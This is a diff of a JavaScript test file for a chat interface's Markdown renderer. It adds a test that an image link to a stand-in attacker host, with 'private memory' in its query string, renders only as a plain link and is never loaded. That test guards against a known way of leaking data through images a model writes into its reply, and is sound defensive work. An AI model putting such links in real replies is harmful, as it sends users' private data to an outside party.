@@ -31,7 +31,21 @@ test('Markdown images and references render safely with links and preserve raw p
             h(
                 'div',
                 { id: 'reply' },
-                renderMarkdown(raw, undefined, [], [], imageSources([tool({ results: [result] })])),
+                renderMarkdown(
+                    raw,
+                    undefined,
+                    [],
+                    [],
+                    imageSources([
+                        tool({
+                            results: [
+                                result,
+                                { ...result, imageUrl: 'https://example.org/x.png' },
+                                { ...result, imageUrl: 'https://example.org/ref.png' },
+                            ],
+                        }),
+                    ]),
+                ),
             ),
         ),
     ).window.document;
@@ -97,7 +111,13 @@ test('Reply credits a saved find_images result and replaces a dead image without
 
 test('an empty-alt Markdown image still gives its image link an accessible name', async (t) => {
     const { container, cleanup } = await render(
-        h('div', null, renderMarkdown('![](https://example.org/picture.png)')),
+        h(
+            'div',
+            null,
+            renderMarkdown('![](https://example.org/picture.png)', undefined, [], [], {
+                'https://example.org/picture.png': { source: 'https://example.org/' },
+            }),
+        ),
         ui,
     );
     t.after(cleanup);
@@ -134,4 +154,35 @@ test('an image found with find_images credits its resource and the credit jumps 
     entry.scrollIntoView = () => {};
     await act(async () => credit.click());
     assert.equal(container.ownerDocument.activeElement, entry.querySelector('a'));
+});
+
+test('only images a find_images call returned load; any other address is a plain link with its alt text', async (t) => {
+    const leak = 'https://attacker.example/x.png?note=private%20memory';
+    const { container, cleanup } = await render(
+        h(Reply, {
+            text: `![Binary heap](${result.imageUrl})\n\n![Chart](${leak})\n\n![](${leak}#2)\n\n[![Inside](${leak}#3)](https://example.org/page)`,
+            underlines: [],
+            tools: [tool({ results: [result] })],
+        }),
+        ui,
+    );
+    t.after(cleanup);
+    assert.deepEqual(
+        [...container.querySelectorAll('[src]')].map((el) => el.getAttribute('src')),
+        [result.imageUrl],
+        'the page requests only the listed image',
+    );
+    const links = [...container.querySelectorAll('a')].filter((a) => a.href.startsWith(leak));
+    assert.deepEqual(
+        links.map((a) => [a.textContent, a.target, a.rel]),
+        [
+            ['Chart', '_blank', 'noopener noreferrer'],
+            [`${leak}#2`, '_blank', 'noopener noreferrer'],
+        ],
+    );
+    assert.equal(
+        container.querySelector('a[href="https://example.org/page"]').textContent,
+        'Inside',
+    );
+    assert.equal(container.querySelector('a a'), null);
 });
